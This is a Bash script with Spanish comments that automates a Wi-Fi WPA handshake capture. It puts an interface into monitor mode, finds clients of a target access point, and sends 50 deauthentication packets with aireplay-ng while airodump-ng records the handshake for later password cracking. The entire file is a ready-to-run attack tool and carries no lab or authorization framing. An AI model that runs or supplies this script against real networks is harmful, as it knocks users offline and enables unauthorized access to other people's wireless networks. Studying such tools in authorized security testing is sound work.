#!/bin/bash

# ========== VALIDACIÓN DE DEPENDENCIAS ==========
REQUIRED_CMDS=(airmon-ng airodump-ng aireplay-ng timeout iw awk grep iconv)
for cmd in "${REQUIRED_CMDS[@]}"; do
  if ! command -v "$cmd" &>/dev/null; then
    echo "Faltante: $cmd. Instalalo para continuar."
    exit 1
  fi
done

# ========== PARÁMETROS ==========
IFACE="${1:-}"
BSSID="${2:-}"
CANAL="${3:-}"
ESSID="${4:-}"
CAPTURE_DURATION="${5:-90}"

if [[ -z "$IFACE" || -z "$BSSID" || -z "$CANAL" || -z "$ESSID" ]]; then
  echo "Uso: scripts/captura_individual.sh <INTERFAZ> <BSSID> <CANAL> <ESSID> [DURACIÓN]"
  echo "Ejemplo: scripts/captura_individual.sh wlan0 A4:7C:C9:2D:7F:24 9 BVNET-FAAC 60"
  exit 1
fi

# ========== CONFIGURACIÓN ==========
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_DIR="$SCRIPT_DIR/output"
mkdir -p "$OUTPUT_DIR"

SAFE_ESSID=$(echo "$ESSID" | iconv -f utf8 -t ascii//TRANSLIT | tr -cd '[:alnum:]_-' | tr ' ' '_')
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
FILE="$OUTPUT_DIR/handshake_${SAFE_ESSID}_${TIMESTAMP}"

# ========== PREPARACIÓN ==========
echo "🔧 Matando procesos que interfieren con el modo monitor..."
sudo airmon-ng check kill

echo "Activando modo monitor en $IFACE..."
sudo airmon-ng start "$IFACE" >/dev/null

# Detectar interfaz en modo monitor (por si fue renombrada)
MONITOR_IFACE=$(iw dev | awk '/Interface/ {print $2}' | grep "$IFACE" || iw dev | awk '/Interface/ {print $2}' | grep -v "$IFACE")
echo "Usando interfaz: $MONITOR_IFACE"
echo

# ========== DETECCIÓN DE CLIENTES ==========
echo "Buscando clientes conectados a $ESSID..."
TEMP_CSV=$(mktemp)
sudo airodump-ng --bssid "$BSSID" -c "$CANAL" --write "$TEMP_CSV" --output-format csv "$MONITOR_IFACE" &
PID=$!
sleep 15
kill "$PID" >/dev/null 2>&1
wait "$PID" 2>/dev/null || true

CLIENTES=$(awk '
  BEGIN {found=0; count=0}
  /^Station MAC/ {found=1; next}
  found && NF>0 {count++}
  END {print count}
' "${TEMP_CSV}-01.csv")

rm -f "${TEMP_CSV}"*

if [[ "$CLIENTES" -eq 0 ]]; then
  echo "No se detectaron clientes conectados a $ESSID. Abortando captura."
else
  echo "$CLIENTES cliente(s) conectado(s) a $ESSID."
  echo "[+] Iniciando captura durante $CAPTURE_DURATION segundos..."

  timeout "$CAPTURE_DURATION" sudo airodump-ng \
    --bssid "$BSSID" \
    -c "$CANAL" \
    -w "$FILE" \
    "$MONITOR_IFACE" &

  sleep 5
  echo "    └─ Enviando 50 paquetes de deauth..."
  sudo aireplay-ng --deauth 50 -a "$BSSID" "$MONITOR_IFACE"

  wait
  echo "Captura completada: ${FILE}.cap"
fi

# ========== RESTAURACIÓN ==========
echo
echo "Desactivando modo monitor..."
sudo airmon-ng stop "$MONITOR_IFACE" >/dev/null

echo "Restaurando servicios de red..."
sudo service NetworkManager restart
sudo service wpa_supplicant restart

echo "Proceso finalizado. Handshake y archivos auxiliares guardados en: $OUTPUT_DIR"
